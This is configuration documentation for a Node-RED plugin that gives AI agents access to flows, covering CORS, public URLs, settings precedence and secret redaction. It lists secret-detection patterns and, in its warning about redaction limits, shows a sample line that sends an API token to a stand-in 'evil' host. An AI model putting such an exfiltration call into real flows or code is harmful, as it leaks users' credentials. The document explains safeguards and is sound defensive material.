# Configuration

In `settings.js`:

```js
module.exports = {
  // adminAuth: { ... }, // required for AI features in normal setups
  aiAccess: {
    // Master switch (default: true). Also editable in the editor sidebar tab.
    enabled: true,
    // Local-only opt-in when adminAuth is disabled (default: false)
    allowWithoutAdminAuth: false,
    // Access-link default TTL in seconds (default: 14400 = 4h)
    defaultLinkTtlSeconds: 14400,
    // Max concurrent active access links (default: 10)
    maxActiveLinks: 10,
    // Deploy type used on approve (default: "nodes"; also "flows" | "full")
    defaultDeploymentType: 'nodes',
    approveQueueTimeoutMs: 60_000, // maximum time waiting to start approval
    deployTimeoutMs: 60_000, // caller deadline; does not cancel deployment
    deployHardCapMs: 300_000, // release the queue even if deployment never settles
    // In-memory rate limits for /mcp/api and /mcp/a (per IP + per access token)
    rateLimitWindowMs: 60000,
    rateLimitMaxPerIp: 600,
    rateLimitMaxPerToken: 300,
    // Public base URL for absolute links (access-link url, reviewUrl,
    // accessLinksUrl). Set this behind a TLS-terminating proxy (default: unset)
    // publicBaseUrl: 'https://nodered.example.com',
    // Browser origins allowed to call /mcp/a, /mcp/api, and /mcp/rpc
    // cross-origin (default: none — no CORS headers are sent)
    // corsAllowedOrigins: ['https://app.example.com'],
    // Secret-like names redacted from AI responses (default list below;
    // [] turns off name matching — token formats are always redacted)
    // secretNamePatterns: ['PASSWORD', 'SECRET', 'TOKEN', 'API_KEY', 'KEY'],
    // MCP OAuth (disabled by default; publicBaseUrl is the issuer)
    // oauth: {
    //   enabled: true,
    //   accessTokenTtlSec: 3600,
    //   refreshIdleTtlSec: 2592000,
    //   dcrMaxClients: 5,
    // },
  },
};
```

### Absolute URLs behind a reverse proxy

Access-link `url`, proposal `reviewUrl`, and `accessLinksUrl` (in
`token_expired`) are absolute URLs built by one shared helper:

1. Effective `aiAccess.publicBaseUrl`, when set, overrides the request origin.
   The sidebar/settings API accepts an HTTPS origin without a path, query,
   fragment, or credentials (HTTP localhost / loopback is allowed for
   development). An empty value uses the request origin.
2. Otherwise, when Express `trust proxy` is enabled (for example
   `httpServerOptions: { 'trust proxy': true }`), the first `X-Forwarded-Proto`
   and `X-Forwarded-Host` values are used.
3. Otherwise the request `Host` header and the connection protocol are used;
   `X-Forwarded-*` headers are ignored so clients cannot spoof link origins.

Forwarded and `Host` values are validated: the scheme must be `http` or `https`
(else the connection scheme is used) and the host must be a DNS name, IPv4, or
bracketed IPv6 literal with an optional port. An invalid forwarded host falls
back to `Host`; an invalid `Host` yields relative paths. The MCP client snippets
in the GET-link guide use the same origin, and show a `https://YOUR-NODE-RED`
placeholder only when no origin can be determined.

Behind a TLS-terminating proxy (for example Cloudflare) with neither option set,
links therefore start with `http://`.

### Public URL reachability check

Public URL **Check** uses `POST /mcp/api/v1/settings/check-public-url` and
requires `*` permission because it performs an outbound request. It validates
the form URL, fetches only `{publicBaseUrl}{httpAdminRoot}/mcp/api/v1`
(discovery), times out after 5 seconds, and never follows redirects. The result
reports the HTTP status or a connection/timeout error; it does not save the
form. Loopback checks use Node-RED's own listening port; behind a reverse proxy,
use the internal Node-RED port. Unix-socket listeners are not supported. HTTPS
checks using a self-signed certificate fail because TLS verification remains
enabled. Saving a Public URL with a private/internal IP literal is allowed, but
the settings response and sidebar show a warning.

### CORS

CORS only affects code running in a browser (a web page calling the plugin from
another origin). Server-side AI fetchers and agents (for example Gemini,
ChatGPT, or an MCP client running outside a browser) ignore CORS and are not
affected by this setting.

By default the AI-facing endpoints (`/mcp/a/*`, `/mcp/api/*`, `/mcp/rpc`) send
**no** CORS headers, overriding Node-RED's built-in
`Access-Control-Allow-Origin: *` for those paths. To allow a browser app, list
its origin in `aiAccess.corsAllowedOrigins` via the AI Access sidebar or
settings API. Changes apply immediately. The API rejects any invalid origin in
the supplied list (including paths, credentials, queries, and fragments). For a
listed `Origin` the response echoes it in `Access-Control-Allow-Origin` with
`Vary: Origin`, and `OPTIONS` preflight returns `204` with allowed methods
(`GET, POST, DELETE, OPTIONS`) and headers (`Authorization`, `Content-Type`,
`Accept`, `Mcp-Session-Id`, `Mcp-Protocol-Version`, `Last-Event-ID`). Origins
match case-insensitively and the configured origin is echoed; malformed origins
are rejected. Exposed headers include `Mcp-Session-Id`, `WWW-Authenticate`,
`Retry-After`, and the `RateLimit*` headers. Other origins get no CORS headers.

### Secret redaction

Every AI-facing response (MCP tools, REST with an access link or OAuth token,
GET links, and proposal bodies/diffs shown to AI) has likely secrets replaced
with `[REDACTED]`. The dashboard (admin session) always shows real values.

- **By name**: env entries on tabs, groups, subflows, subflow instances, and
  `global-config`, secret-named node settings (e.g. `password`), and name/value
  pairs inside node config (change rules, inject props, http request headers)
  whose name matches a pattern. Redacted env entries get `redacted: true`.
- **By content**: all other string fields, including function
  `func`/`initialize`/`finalize`, are scanned for AWS (`AKIA…`), GitHub
  (`ghp_…`, `github_pat_…`), Slack (`xox…`, webhook URLs), OpenAI (`sk-…`),
  Stripe, Google (`AIza…`), JWTs, PEM private keys, `Bearer`/`Basic` headers,
  `scheme://user:password@` URLs, and `name = "literal"` / `name: 'literal'`
  assignments whose name matches a pattern. Only the literal is replaced.
- Redacted nodes list the redacted field paths in `_aiRedactions`.
- Also caught: connection strings / DSNs (`Server=…;Password=…;`), URL query
  params with a secret name (`?key=abc123&x=1` → only `abc123`), unquoted
  `password: x` / `token=x` in non-code text fields, and
  `Buffer.from("user:pw")` / `btoa('user:pw')` basic-auth literals. Node
  `name`/`label`/`info` are content-scanned only (no key-name rule). Any single
  string field over 256 KB is sent to AI as `[REDACTED]` (decided by length
  only, so reads and submits always agree). All patterns are length-bounded /
  linear (no ReDoS).
- **Unquoted values** depend on name strength. Strong names
  (`PASSWORD PASSWD PASSPHRASE SECRET CLIENT_SECRET TOKEN API_KEY APIKEY PRIVATE CREDENTIAL PWD PW`):
  any value of 3+ chars except `none`/`null`/`${VAR}`-style references. Weak
  names (`KEY AUTH SESSION COOKIE CONN PASS …` and custom patterns): the value
  must look random — a digit or symbol, 16+ chars, 3+ character classes, or
  Shannon entropy ≥ 3 — so prose like `Session: started` / `key: value` stays.
- **Proposals (strict restore)**: a `[REDACTED]` placeholder is restored to the
  original secret on submit only when it stays exactly where it was shown: same
  node id and field, env and name/value entries (headers, change rules) matched
  by their exact name — never by array position — no more placeholders in the
  field than the original had, and the text around each placeholder on its line
  unchanged. Anything else (a new or duplicated placeholder, a renamed env var,
  a header renamed to take a secret value, an edited line) makes the submit fail
  with `redacted_placeholder_mismatch` and nothing is stored.
- Approving: the proposal card lists every field whose secret was restored, and
  shows a red warning (`secret_destination_changed`) when a node holding a
  restored secret had its `url`/`host`/`port`/`method`/`headers`/type or similar
  destination changed, or `secret_node_code_changed` when its code changed. Also
  flagged when secrets were restored: `secret_wires_changed` (its output wires
  changed), `secret_scope_changed` (tab/group env such as `${API_HOST}`, or a
  config node it uses, changed), `outbound_node_changed` (an http, mqtt, tcp,
  udp, email, websocket, function, exec or file node was added/changed), and
  `secret_tab_changed` (any other node in the tab changed).
- Always flagged (with or without restored secrets): `outbound_node_changed` for
  any added/changed http request/response, mqtt, tcp, udp, email, websocket,
  link out/call, function, exec or file node — or any node type with a
  `url`/`host`/`server`/`broker`/`endpoint` field — and `secret_reference_added`
  when added/changed code or config reads a secret-named value (`env.get("X")`,
  `$env('X')`, `${X}`, `global.get`, `flow.get`, typed inputs of type
  `env`/`global`/`flow`).
- Node-RED credentials (and `cred` env entries) are never part of flow output.
- The audit log records `ai.redacted` with the count per response (never
  values).

**Redaction is not exfiltration protection.** It keeps secret values out of what
the AI reads; it cannot stop an approved flow from sending data. Review every
proposal — especially red security banners — before approving.

**Limits — redaction is best-effort.** Detection uses names and known token
formats; secrets with unusual names or formats can still reach AI. Strict
restore only stops the AI from _copying_ a placeholder to a new place: an AI
proposal can still read an existing variable at runtime (e.g. add
`fetch(evil, {body: env.get('API_TOKEN')})`, or use `token` already defined in a
function) because flows run with the real values. Always review code and
destination changes in proposals before approving, especially on nodes flagged
above.

Default patterns (case-insensitive whole words; a trailing `S` is allowed, and
patterns of 6+ letters also match glued names like `DBPASSWORD`):
`PASSWORD PASSWD PASS PWD PW PASSPHRASE SECRET CLIENT_SECRET TOKEN API_KEY APIKEY KEY PRIVATE CREDENTIAL AUTH AUTHORIZATION BEARER SESSION COOKIE CONNECTION_STRING CONN_STR CONN DSN`.
`KEY` matches `API_KEY` / `apiKey` but not `KEYBOARD` or `MONKEY`; `AUTH` does
not match `AUTHOR` or `OAUTH`. Names ending in a descriptor word (`TOKEN_URL`,
`AUTH_TYPE`, `SESSION_TIMEOUT`, `keyType`) are not redacted. Edit the list on
the dashboard **Settings** page (add, remove, reset to defaults) or lock it with
`aiAccess.secretNamePatterns`.

### Settings precedence

Effective values are resolved **without restart** in this order (highest wins):

1. **`settings.js`** — keys present in the `aiAccess` block are locked
2. **Disk** — `<userDir>/.ai-access/config.json` (dashboard **Settings** / **MCP
   OAuth** pages, editor sidebar toggles, or `PUT /mcp/api/v1/settings`)
3. **Built-in defaults** — as documented above

This is a breaking precedence change in 0.2.0: settings.js now wins over disk.
Legacy `settings.json` is read when `config.json` is absent; the next save
writes `config.json`. Locked fields show a lock indicator and disabled input.
PUT ignores locked keys while applying unlocked ones; GET and PUT return
per-field `sources` (`settings.js`, `disk`, or `default`) and the precedence
order.

The editor right-hand sidebar tab (**AI Access**) holds only: the **Enable AI
Access features** toggle (the `allowWithoutAdminAuth` local-only opt-in when
`adminAuth` is off), the **Enable MCP OAuth** toggle, an OAuth route-conflict
warning with links that reveal the conflicting node (only when conflicts exist),
and an **Open AI Access dashboard** button.

Everything else is on the dashboard. The **Settings** page lets `*` admins change
default deploy type, access-token TTL, maximum active tokens, Public URL (with a
reachability **Check**), CORS origins, secret redaction patterns, and the three
rate limits, and shows Express's effective `trust proxy` setting. The **MCP
OAuth** page configures token lifetimes and the client limit, lists registered
clients with revoke buttons, and reports route collisions (linking `http in`
nodes to the editor) and the `httpNodeRoot: false` metadata fallback. `read`
users see the same values read-only; writes need `*`, exactly as before. Changes
apply immediately; changing limits starts fresh rate-limit buckets. Enabling
OAuth with no Public URL or an HTTP non-loopback URL shows a warning
confirmation; it does not block the change. Fields set in `settings.js` are
locked.

### Storage and request errors

Storage lives under **`<userDir>/.ai-access`** (`config.json`,
`proposals/*.json`, and append-only `logs/audit.jsonl`). Directories use mode
`0700`, files `0600`. Proposal JSON is capped at **1_500_000 bytes**; oversized
proposal JSON or audit lines return HTTP **413** with `code: payload_too_large`
(never silently truncated). Malformed JSON returns **400** JSON (REST
`invalid_json`, MCP JSON-RPC `-32700`) — never HTML stack traces (middleware is
attached to the editor-api app that owns body-parser, not only the nested plugin
`httpAdmin`). Unauthenticated `/mcp/api/v1` admin calls return JSON
`{ code: "auth_required" }` rather than plain-text `Unauthorized`.

See also: [Dashboard](./dashboard.md), [MCP OAuth](./oauth.md), and
[REST API](./rest-api.md).
